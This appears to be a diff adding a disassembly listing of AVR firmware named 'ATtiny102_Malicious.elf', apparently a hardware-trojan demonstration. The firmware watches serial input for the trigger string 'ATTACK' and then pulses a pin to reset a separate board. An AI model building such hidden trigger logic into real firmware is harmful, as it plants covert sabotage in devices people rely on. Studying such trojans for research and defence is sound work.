@@ -1,0 +1,361 @@
+
+ATtiny102_Malicious.elf:     file format elf32-avr
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+  0 .text         0000020c  00000000  00000000  00000074  2**1
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+  1 .rodata       0000000c  0000420c  0000020c  00000280  2**0
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  2 .data         00000000  00800040  00800040  0000028c  2**0
+                  CONTENTS, ALLOC, LOAD, DATA
+  3 .comment      00000030  00000000  00000000  0000028c  2**0
+                  CONTENTS, READONLY
+  4 .note.gnu.avr.deviceinfo 0000003c  00000000  00000000  000002bc  2**2
+                  CONTENTS, READONLY
+  5 .debug_aranges 00000048  00000000  00000000  000002f8  2**0
+                  CONTENTS, READONLY, DEBUGGING
+  6 .debug_info   0000065f  00000000  00000000  00000340  2**0
+                  CONTENTS, READONLY, DEBUGGING
+  7 .debug_abbrev 00000541  00000000  00000000  0000099f  2**0
+                  CONTENTS, READONLY, DEBUGGING
+  8 .debug_line   00000373  00000000  00000000  00000ee0  2**0
+                  CONTENTS, READONLY, DEBUGGING
+  9 .debug_frame  00000084  00000000  00000000  00001254  2**2
+                  CONTENTS, READONLY, DEBUGGING
+ 10 .debug_str    0000038f  00000000  00000000  000012d8  2**0
+                  CONTENTS, READONLY, DEBUGGING
+ 11 .debug_loc    0000008f  00000000  00000000  00001667  2**0
+                  CONTENTS, READONLY, DEBUGGING
+ 12 .debug_ranges 00000038  00000000  00000000  000016f6  2**0
+                  CONTENTS, READONLY, DEBUGGING
+
+Disassembly of section .text:
+
+00000000 <__vectors>:
+   0:	0f c0       	rjmp	.+30     	; 0x20 <__ctors_end>
+   2:	16 c0       	rjmp	.+44     	; 0x30 <__bad_interrupt>
+   4:	15 c0       	rjmp	.+42     	; 0x30 <__bad_interrupt>
+   6:	14 c0       	rjmp	.+40     	; 0x30 <__bad_interrupt>
+   8:	13 c0       	rjmp	.+38     	; 0x30 <__bad_interrupt>
+   a:	12 c0       	rjmp	.+36     	; 0x30 <__bad_interrupt>
+   c:	11 c0       	rjmp	.+34     	; 0x30 <__bad_interrupt>
+   e:	10 c0       	rjmp	.+32     	; 0x30 <__bad_interrupt>
+  10:	0f c0       	rjmp	.+30     	; 0x30 <__bad_interrupt>
+  12:	0e c0       	rjmp	.+28     	; 0x30 <__bad_interrupt>
+  14:	0d c0       	rjmp	.+26     	; 0x30 <__bad_interrupt>
+  16:	0c c0       	rjmp	.+24     	; 0x30 <__bad_interrupt>
+  18:	0b c0       	rjmp	.+22     	; 0x30 <__bad_interrupt>
+  1a:	0a c0       	rjmp	.+20     	; 0x30 <__bad_interrupt>
+  1c:	09 c0       	rjmp	.+18     	; 0x30 <__bad_interrupt>
+  1e:	08 c0       	rjmp	.+16     	; 0x30 <__bad_interrupt>
+
+00000020 <__ctors_end>:
+  20:	11 27       	eor	r17, r17
+  22:	1f bf       	out	0x3f, r17	; 63
+  24:	cf e5       	ldi	r28, 0x5F	; 95
+  26:	d0 e0       	ldi	r29, 0x00	; 0
+  28:	de bf       	out	0x3e, r29	; 62
+  2a:	cd bf       	out	0x3d, r28	; 61
+  2c:	20 d0       	rcall	.+64     	; 0x6e <main>
+  2e:	ec c0       	rjmp	.+472    	; 0x208 <_exit>
+
+00000030 <__bad_interrupt>:
+  30:	e7 cf       	rjmp	.-50     	; 0x0 <__vectors>
+
+00000032 <PORTS_Init>:
+  return UDR;                       // Return received data.
+}
+
+void USART_Flush( void ){
+  while ( UCSRA & (1<<RXC) ){};
+}
+  32:	47 b1       	in	r20, 0x07	; 7
+  34:	42 60       	ori	r20, 0x02	; 2
+  36:	47 b9       	out	0x07, r20	; 7
+  38:	46 b1       	in	r20, 0x06	; 6
+  3a:	42 60       	ori	r20, 0x02	; 2
+  3c:	46 b9       	out	0x06, r20	; 6
+  3e:	41 b1       	in	r20, 0x01	; 1
+  40:	40 62       	ori	r20, 0x20	; 32
+  42:	41 b9       	out	0x01, r20	; 1
+  44:	41 b1       	in	r20, 0x01	; 1
+  46:	41 60       	ori	r20, 0x01	; 1
+  48:	41 b9       	out	0x01, r20	; 1
+  4a:	08 95       	ret
+
+0000004c <USART_Init>:
+  4c:	9a b9       	out	0x0a, r25	; 10
+  4e:	89 b9       	out	0x09, r24	; 9
+  50:	48 e1       	ldi	r20, 0x18	; 24
+  52:	4d b9       	out	0x0d, r20	; 13
+  54:	4e e0       	ldi	r20, 0x0E	; 14
+  56:	4c b9       	out	0x0c, r20	; 12
+  58:	08 95       	ret
+
+0000005a <USART_Transmit>:
+  5a:	4e b1       	in	r20, 0x0e	; 14
+  5c:	45 ff       	sbrs	r20, 5
+  5e:	fd cf       	rjmp	.-6      	; 0x5a <USART_Transmit>
+  60:	88 b9       	out	0x08, r24	; 8
+  62:	08 95       	ret
+
+00000064 <USART_Receive>:
+  64:	4e b1       	in	r20, 0x0e	; 14
+  66:	44 23       	and	r20, r20
+  68:	ec f7       	brge	.-6      	; 0x64 <USART_Receive>
+  6a:	88 b1       	in	r24, 0x08	; 8
+  6c:	08 95       	ret
+
+0000006e <main>:
+
+
+//-----------------------------------------------------------------------------
+
+int main( void ){
+  6e:	cf 93       	push	r28
+  70:	df 93       	push	r29
+  72:	cd b7       	in	r28, 0x3d	; 61
+  74:	de b7       	in	r29, 0x3e	; 62
+  76:	c0 51       	subi	r28, 0x10	; 16
+  78:	d1 0b       	sbc	r29, r17
+  7a:	0f b7       	in	r16, 0x3f	; 63
+  7c:	f8 94       	cli
+  7e:	de bf       	out	0x3e, r29	; 62
+  80:	0f bf       	out	0x3f, r16	; 63
+  82:	cd bf       	out	0x3d, r28	; 61
+  PORTS_Init();
+  84:	d6 df       	rcall	.-84     	; 0x32 <PORTS_Init>
+  USART_Init(MYUBRR);
+  86:	8c e0       	ldi	r24, 0x0C	; 12
+  88:	90 e0       	ldi	r25, 0x00	; 0
+  8a:	e0 df       	rcall	.-64     	; 0x4c <USART_Init>
+  PORTA |= LED_PIN;                                          // Switch off the LED.
+  8c:	42 b1       	in	r20, 0x02	; 2
+  8e:	40 62       	ori	r20, 0x20	; 32
+  90:	42 b9       	out	0x02, r20	; 2
+  unsigned char c[] = {'a', 'a', 'a', 'a', 'a', 'a'};        // Set buffer to useless characters
+  92:	46 e0       	ldi	r20, 0x06	; 6
+  94:	ec e0       	ldi	r30, 0x0C	; 12
+  96:	f2 e4       	ldi	r31, 0x42	; 66
+  98:	ac 2f       	mov	r26, r28
+  9a:	bd 2f       	mov	r27, r29
+  9c:	af 5f       	subi	r26, 0xFF	; 255
+  9e:	bf 4f       	sbci	r27, 0xFF	; 255
+  a0:	01 91       	ld	r16, Z+
+  a2:	0d 93       	st	X+, r16
+  a4:	4a 95       	dec	r20
+  a6:	e1 f7       	brne	.-8      	; 0xa0 <main+0x32>
+  unsigned char trigger[] = {'A', 'T', 'T', 'A', 'C', 'K'};  // Trigger string
+  a8:	46 e0       	ldi	r20, 0x06	; 6
+  aa:	e2 e1       	ldi	r30, 0x12	; 18
+  ac:	f2 e4       	ldi	r31, 0x42	; 66
+  ae:	ac 2f       	mov	r26, r28
+  b0:	bd 2f       	mov	r27, r29
+  b2:	a9 5f       	subi	r26, 0xF9	; 249
+  b4:	bf 4f       	sbci	r27, 0xFF	; 255
+  b6:	01 91       	ld	r16, Z+
+  b8:	0d 93       	st	X+, r16
+  ba:	4a 95       	dec	r20
+  bc:	e1 f7       	brne	.-8      	; 0xb6 <main+0x48>
+  unsigned char data;
+  
+  while(1){	
+	data = USART_Receive();
+  be:	d2 df       	rcall	.-92     	; 0x64 <USART_Receive>
+  c0:	38 2f       	mov	r19, r24
+
+	if(data) {
+  c2:	88 23       	and	r24, r24
+  c4:	e1 f3       	breq	.-8      	; 0xbe <main+0x50>
+		c[0] = c[1];
+  c6:	ce 5f       	subi	r28, 0xFE	; 254
+  c8:	df 4f       	sbci	r29, 0xFF	; 255
+  ca:	48 81       	ld	r20, Y
+  cc:	c2 50       	subi	r28, 0x02	; 2
+  ce:	d0 40       	sbci	r29, 0x00	; 0
+  d0:	c0 5f       	subi	r28, 0xF0	; 240
+  d2:	df 4f       	sbci	r29, 0xFF	; 255
+  d4:	48 83       	st	Y, r20
+  d6:	c0 51       	subi	r28, 0x10	; 16
+  d8:	d0 40       	sbci	r29, 0x00	; 0
+		c[1] = c[2];
+  da:	cd 5f       	subi	r28, 0xFD	; 253
+  dc:	df 4f       	sbci	r29, 0xFF	; 255
+  de:	28 81       	ld	r18, Y
+  e0:	c3 50       	subi	r28, 0x03	; 3
+  e2:	d0 40       	sbci	r29, 0x00	; 0
+  e4:	ce 5f       	subi	r28, 0xFE	; 254
+  e6:	df 4f       	sbci	r29, 0xFF	; 255
+  e8:	28 83       	st	Y, r18
+  ea:	c2 50       	subi	r28, 0x02	; 2
+  ec:	d0 40       	sbci	r29, 0x00	; 0
+		c[2] = c[3];
+  ee:	cc 5f       	subi	r28, 0xFC	; 252
+  f0:	df 4f       	sbci	r29, 0xFF	; 255
+  f2:	58 81       	ld	r21, Y
+  f4:	c4 50       	subi	r28, 0x04	; 4
+  f6:	d0 40       	sbci	r29, 0x00	; 0
+  f8:	c3 5f       	subi	r28, 0xF3	; 243
+  fa:	df 4f       	sbci	r29, 0xFF	; 255
+  fc:	58 83       	st	Y, r21
+  fe:	cd 50       	subi	r28, 0x0D	; 13
+ 100:	d0 40       	sbci	r29, 0x00	; 0
+ 102:	cd 5f       	subi	r28, 0xFD	; 253
+ 104:	df 4f       	sbci	r29, 0xFF	; 255
+ 106:	58 83       	st	Y, r21
+ 108:	c3 50       	subi	r28, 0x03	; 3
+ 10a:	d0 40       	sbci	r29, 0x00	; 0
+		c[3] = c[4];
+ 10c:	cb 5f       	subi	r28, 0xFB	; 251
+ 10e:	df 4f       	sbci	r29, 0xFF	; 255
+ 110:	68 81       	ld	r22, Y
+ 112:	c5 50       	subi	r28, 0x05	; 5
+ 114:	d0 40       	sbci	r29, 0x00	; 0
+ 116:	c2 5f       	subi	r28, 0xF2	; 242
+ 118:	df 4f       	sbci	r29, 0xFF	; 255
+ 11a:	68 83       	st	Y, r22
+ 11c:	ce 50       	subi	r28, 0x0E	; 14
+ 11e:	d0 40       	sbci	r29, 0x00	; 0
+ 120:	cc 5f       	subi	r28, 0xFC	; 252
+ 122:	df 4f       	sbci	r29, 0xFF	; 255
+ 124:	68 83       	st	Y, r22
+ 126:	c4 50       	subi	r28, 0x04	; 4
+ 128:	d0 40       	sbci	r29, 0x00	; 0
+		c[4] = c[5];
+ 12a:	ca 5f       	subi	r28, 0xFA	; 250
+ 12c:	df 4f       	sbci	r29, 0xFF	; 255
+ 12e:	48 81       	ld	r20, Y
+ 130:	c6 50       	subi	r28, 0x06	; 6
+ 132:	d0 40       	sbci	r29, 0x00	; 0
+ 134:	c1 5f       	subi	r28, 0xF1	; 241
+ 136:	df 4f       	sbci	r29, 0xFF	; 255
+ 138:	48 83       	st	Y, r20
+ 13a:	cf 50       	subi	r28, 0x0F	; 15
+ 13c:	d0 40       	sbci	r29, 0x00	; 0
+ 13e:	cb 5f       	subi	r28, 0xFB	; 251
+ 140:	df 4f       	sbci	r29, 0xFF	; 255
+ 142:	48 83       	st	Y, r20
+ 144:	c5 50       	subi	r28, 0x05	; 5
+ 146:	d0 40       	sbci	r29, 0x00	; 0
+		c[5] = data;
+ 148:	ca 5f       	subi	r28, 0xFA	; 250
+ 14a:	df 4f       	sbci	r29, 0xFF	; 255
+ 14c:	88 83       	st	Y, r24
+ 14e:	c6 50       	subi	r28, 0x06	; 6
+ 150:	d0 40       	sbci	r29, 0x00	; 0
+		
+		USART_Transmit(data); // For testing only
+ 152:	83 df       	rcall	.-250    	; 0x5a <USART_Transmit>
+		
+		if(c[0]==trigger[0] && c[1]==trigger[1] && c[2]==trigger[2] && c[3]==trigger[3] && c[4]==trigger[4] && c[5]==trigger[5]) {
+ 154:	c9 5f       	subi	r28, 0xF9	; 249
+ 156:	df 4f       	sbci	r29, 0xFF	; 255
+ 158:	48 81       	ld	r20, Y
+ 15a:	c7 50       	subi	r28, 0x07	; 7
+ 15c:	d0 40       	sbci	r29, 0x00	; 0
+ 15e:	c0 5f       	subi	r28, 0xF0	; 240
+ 160:	df 4f       	sbci	r29, 0xFF	; 255
+ 162:	58 81       	ld	r21, Y
+ 164:	c0 51       	subi	r28, 0x10	; 16
+ 166:	d0 40       	sbci	r29, 0x00	; 0
+ 168:	54 13       	cpse	r21, r20
+ 16a:	a9 cf       	rjmp	.-174    	; 0xbe <main+0x50>
+ 16c:	c8 5f       	subi	r28, 0xF8	; 248
+ 16e:	df 4f       	sbci	r29, 0xFF	; 255
+ 170:	48 81       	ld	r20, Y
+ 172:	c8 50       	subi	r28, 0x08	; 8
+ 174:	d0 40       	sbci	r29, 0x00	; 0
+ 176:	24 13       	cpse	r18, r20
+ 178:	a2 cf       	rjmp	.-188    	; 0xbe <main+0x50>
+ 17a:	c7 5f       	subi	r28, 0xF7	; 247
+ 17c:	df 4f       	sbci	r29, 0xFF	; 255
+ 17e:	48 81       	ld	r20, Y
+ 180:	c9 50       	subi	r28, 0x09	; 9
+ 182:	d0 40       	sbci	r29, 0x00	; 0
+ 184:	c3 5f       	subi	r28, 0xF3	; 243
+ 186:	df 4f       	sbci	r29, 0xFF	; 255
+ 188:	68 81       	ld	r22, Y
+ 18a:	cd 50       	subi	r28, 0x0D	; 13
+ 18c:	d0 40       	sbci	r29, 0x00	; 0
+ 18e:	64 13       	cpse	r22, r20
+ 190:	96 cf       	rjmp	.-212    	; 0xbe <main+0x50>
+ 192:	c6 5f       	subi	r28, 0xF6	; 246
+ 194:	df 4f       	sbci	r29, 0xFF	; 255
+ 196:	48 81       	ld	r20, Y
+ 198:	ca 50       	subi	r28, 0x0A	; 10
+ 19a:	d0 40       	sbci	r29, 0x00	; 0
+ 19c:	c2 5f       	subi	r28, 0xF2	; 242
+ 19e:	df 4f       	sbci	r29, 0xFF	; 255
+ 1a0:	58 81       	ld	r21, Y
+ 1a2:	ce 50       	subi	r28, 0x0E	; 14
+ 1a4:	d0 40       	sbci	r29, 0x00	; 0
+ 1a6:	54 13       	cpse	r21, r20
+ 1a8:	8a cf       	rjmp	.-236    	; 0xbe <main+0x50>
+ 1aa:	c5 5f       	subi	r28, 0xF5	; 245
+ 1ac:	df 4f       	sbci	r29, 0xFF	; 255
+ 1ae:	48 81       	ld	r20, Y
+ 1b0:	cb 50       	subi	r28, 0x0B	; 11
+ 1b2:	d0 40       	sbci	r29, 0x00	; 0
+ 1b4:	c1 5f       	subi	r28, 0xF1	; 241
+ 1b6:	df 4f       	sbci	r29, 0xFF	; 255
+ 1b8:	68 81       	ld	r22, Y
+ 1ba:	cf 50       	subi	r28, 0x0F	; 15
+ 1bc:	d0 40       	sbci	r29, 0x00	; 0
+ 1be:	64 13       	cpse	r22, r20
+ 1c0:	7e cf       	rjmp	.-260    	; 0xbe <main+0x50>
+ 1c2:	c4 5f       	subi	r28, 0xF4	; 244
+ 1c4:	df 4f       	sbci	r29, 0xFF	; 255
+ 1c6:	48 81       	ld	r20, Y
+ 1c8:	cc 50       	subi	r28, 0x0C	; 12
+ 1ca:	d0 40       	sbci	r29, 0x00	; 0
+ 1cc:	34 13       	cpse	r19, r20
+ 1ce:	77 cf       	rjmp	.-274    	; 0xbe <main+0x50>
+			USART_Transmit('!');            // Send '!' for testing purposes to show trigger string match
+ 1d0:	81 e2       	ldi	r24, 0x21	; 33
+ 1d2:	43 df       	rcall	.-378    	; 0x5a <USART_Transmit>
+			USART_Transmit( 13 );
+ 1d4:	8d e0       	ldi	r24, 0x0D	; 13
+ 1d6:	41 df       	rcall	.-382    	; 0x5a <USART_Transmit>
+			USART_Transmit( 10 );
+ 1d8:	8a e0       	ldi	r24, 0x0A	; 10
+ 1da:	3f df       	rcall	.-386    	; 0x5a <USART_Transmit>
+			PORTA &= ~LED_PIN;              // Switch on the LED.
+ 1dc:	42 b1       	in	r20, 0x02	; 2
+ 1de:	4f 7d       	andi	r20, 0xDF	; 223
+ 1e0:	42 b9       	out	0x02, r20	; 2
+			PORTA |= TRIGGER_PIN;			// Trigger reset on malicious board by setting TRIGGER_PIN
+ 1e2:	42 b1       	in	r20, 0x02	; 2
+ 1e4:	41 60       	ori	r20, 0x01	; 1
+ 1e6:	42 b9       	out	0x02, r20	; 2
+	#else
+		//round up by default
+		__ticks_dc = (uint32_t)(ceil(fabs(__tmp)));
+	#endif
+
+	__builtin_avr_delay_cycles(__ticks_dc);
+ 1e8:	4f e7       	ldi	r20, 0x7F	; 127
+ 1ea:	5a e1       	ldi	r21, 0x1A	; 26
+ 1ec:	66 e0       	ldi	r22, 0x06	; 6
+ 1ee:	41 50       	subi	r20, 0x01	; 1
+ 1f0:	50 40       	sbci	r21, 0x00	; 0
+ 1f2:	60 40       	sbci	r22, 0x00	; 0
+ 1f4:	e1 f7       	brne	.-8      	; 0x1ee <main+0x180>
+ 1f6:	00 c0       	rjmp	.+0      	; 0x1f8 <main+0x18a>
+ 1f8:	00 00       	nop
+			_delay_ms(2000);
+			PORTA &= ~TRIGGER_PIN; 
+ 1fa:	42 b1       	in	r20, 0x02	; 2
+ 1fc:	4e 7f       	andi	r20, 0xFE	; 254
+ 1fe:	42 b9       	out	0x02, r20	; 2
+			PORTA |= LED_PIN;               // Switch off the LED.
+ 200:	42 b1       	in	r20, 0x02	; 2
+ 202:	40 62       	ori	r20, 0x20	; 32
+ 204:	42 b9       	out	0x02, r20	; 2
+ 206:	5b cf       	rjmp	.-330    	; 0xbe <main+0x50>
+
+00000208 <_exit>:
+ 208:	f8 94       	cli
+
+0000020a <__stop_program>:
+ 20a:	ff cf       	rjmp	.-2      	; 0x20a <__stop_program>
